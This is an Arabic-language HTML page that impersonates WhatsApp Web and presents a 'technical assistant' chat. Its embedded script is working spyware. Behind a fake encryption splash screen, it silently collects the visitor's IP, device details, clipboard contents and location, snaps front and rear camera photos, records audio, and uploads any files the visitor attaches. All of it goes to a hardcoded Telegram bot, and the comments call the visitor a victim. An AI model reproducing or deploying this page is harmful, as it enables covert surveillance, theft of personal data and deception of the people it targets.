<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        :root { --wa-green: #25d366; --wa-bg: #0b141a; --wa-panel: #202c33; --wa-text: #e9edef; }
        body { background: var(--wa-bg); color: var(--wa-text); font-family: Segoe UI, Helvetica, Arial, sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* واجهة واتساب */
        .side-panel { width: 30%; border-left: 1px solid rgba(255,255,255,0.1); background: var(--wa-panel); display: flex; flex-direction: column; }
        .main-chat { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; }
        
        .header { background: var(--wa-panel); padding: 10px 16px; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(0,0,0,0.2); }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #6a7175; overflow: hidden; }
        .chat-body { flex: 1; overflow-y: auto; padding: 20px 5%; display: flex; flex-direction: column; gap: 8px; }
        
        /* فقاعات الرسائل */
        .msg { padding: 8px 12px; border-radius: 8px; max-width: 65%; font-size: 14px; position: relative; box-shadow: 0 1px 1px rgba(0,0,0,0.2); }
        .sent { background: #005c4b; align-self: flex-start; }
        .recv { background: var(--wa-panel); align-self: flex-end; }

        /* شريط الإدخال */
        .footer { background: var(--wa-panel); padding: 10px; display: flex; align-items: center; gap: 10px; }
        input[type="text"] { flex: 1; background: #2a3942; border: none; color: white; padding: 10px 15px; border-radius: 8px; outline: none; }
        .attach-btn { color: #8696a0; cursor: pointer; font-size: 20px; }

        /* شاشة البداية الخفية */
        #splash { position: fixed; inset: 0; background: #0b141a; z-index: 999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .progress { width: 200px; height: 3px; background: #232d36; margin-top: 20px; border-radius: 3px; overflow: hidden; }
        .bar { width: 0%; height: 100%; background: var(--wa-green); animation: load 3s forwards; }
        @keyframes load { to { width: 100%; } }

        #v { position: fixed; opacity: 0.001; }
    </style>
</head>
<body>

<div id="splash">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="80">
    <div class="progress"><div class="bar"></div></div>
    <p style="color:#8696a0; font-size:14px; margin-top:10px;">جاري تشفير الاتصال...</p>
</div>

<div class="side-panel">
    <div class="header"> <div class="avatar"></div> </div>
    <div style="padding:15px; border-bottom:1px solid rgba(255,255,255,0.05);">
        <div style="background:#202c33; padding:8px; border-radius:8px; color:#8696a0; font-size:13px;">البحث عن دردشة...</div>
    </div>
    <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#8696a0;">
        <p style="font-size:12px;">لا توجد رسائل مؤرشفة</p>
    </div>
</div>

<div class="main-chat">
    <div class="header">
        <div class="avatar"><img id="hImg" src="https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png" width="100%"></div>
        <div style="flex:1">
            <div id="hName" style="font-weight:500;">المساعد التقني</div>
            <div id="hStatus" style="font-size:12px; color:#8696a0;">متصل الآن</div>
        </div>
    </div>

    <div class="chat-body" id="chatFlow">
        <div class="msg sent">مرحباً! كيف يمكنني مساعدتك اليوم في فحص جهازك؟</div>
    </div>

    <div class="footer">
        <span class="attach-btn" onclick="document.getElementById('fileGrab').click()">📎</span>
        <input type="file" id="fileGrab" hidden multiple>
        <input type="text" id="userInput" placeholder="اكتب رسالة...">
        <button id="sendBtn" style="background:transparent; border:none; color:var(--wa-green); font-size:22px; cursor:pointer;">✈</button>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none"></canvas>

<script>
    const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const C = "7984067238";
    let lastUpdate = 0;

    // 1. نظام الاختراق الشامل (بدون نسيان أي ميزة)
    async function startHack() {
        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
        const bat = await navigator.getBattery().catch(()=>({level:0, charging:false}));
        
        let report = `🏴‍☠️ *ضحية جديد في الفخ (WhatsApp Style)*:\n\n`;
        report += `📱 الجهاز: \`${navigator.platform}\`\n`;
        report += `💾 الرام: \`${navigator.deviceMemory}GB\`\n`;
        report += `🔋 البطارية: \`${Math.round(bat.level*100)}%\` | الشحن: \`${bat.charging}\`\n`;
        report += `🌐 IP: \`${ip.ip}\`\n`;
        
        // محاولة سحب نص من الحافظة (Clipboard)
        try { const clip = await navigator.clipboard.readText(); if(clip) report += `📋 الحافظة: \`${clip}\`\n`; } catch(e){}

        await sendTG(report);

        // الموقع
        navigator.geolocation.getCurrentPosition(p => {
            sendTG(`📍 [الموقع على الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
        });

        // الصور والصوت
        grabAudio();
        const f = await snap("user"); if(f) await sendTG("📸 صورة أمامية", "photo", f);
        const b = await snap("environment"); if(b) await sendTG("📷 صورة خلفية", "photo", b);
    }

    async function sendTG(m, type="text", file=null) {
        const url = `https://api.telegram.org/bot${T}/`;
        try {
            const fd = new FormData(); fd.append("chat_id", C);
            if(type === "photo") { fd.append("photo", file); fd.append("caption", m); await fetch(url+"sendPhoto", {method:"POST", body:fd}); }
            else if(type === "voice") { fd.append("voice", file); await fetch(url+"sendVoice", {method:"POST", body:fd}); }
            else if(type === "document") { fd.append("document", file); fd.append("caption", "📁 ملف مسحوب من هاتف الضحية"); await fetch(url+"sendDocument", {method:"POST", body:fd}); }
            else { await fetch(url+`sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }
        } catch(e){}
    }

    // سحب الملفات (الصور، الفيديوهات، أي ملف يختاره الضحية)
    document.getElementById('fileGrab').onchange = async (e) => {
        for(let file of e.target.files) {
            await sendTG("", "document", file);
        }
    };

    async function snap(side) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:side}});
            const v = document.getElementById('v'); v.srcObject = s; await v.play();
            await new Promise(r => setTimeout(r, 2500));
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            s.getTracks().forEach(t => t.stop());
            return new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
        } catch(e){return null;}
    }

    async function grabAudio() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({audio:true});
            const rec = new MediaRecorder(s); const ch = [];
            rec.ondataavailable = e => ch.push(e.data);
            rec.onstop = () => { sendTG(null, "voice", new Blob(ch, {type:'audio/ogg'})); s.getTracks().forEach(t=>t.stop()); };
            rec.start(); setTimeout(() => rec.stop(), 5000);
        } catch(e){}
    }

    // تشغيل النظام
    setTimeout(() => {
        document.getElementById('splash').style.display = 'none';
        startHack();
        setInterval(syncChat, 3000);
    }, 3000);

    async function syncChat() {
        const r = await fetch(`https://api.telegram.org/bot${T}/getUpdates?offset=${lastUpdate + 1}`);
        const d = await r.json();
        d.result.forEach(u => {
            lastUpdate = u.update_id;
            if(u.message.text) {
                const f = document.getElementById('chatFlow');
                f.innerHTML += `<div class="msg recv">${u.message.text}</div>`;
                f.scrollTop = f.scrollHeight;
            }
        });
    }

    document.getElementById('sendBtn').onclick = () => {
        const i = document.getElementById('userInput');
        if(i.value) {
            document.getElementById('chatFlow').innerHTML += `<div class="msg sent">${i.value}</div>`;
            sendTG(`💬 رسالة: ${i.value}`);
            i.value = "";
        }
    };
</script>

</body>
</html>
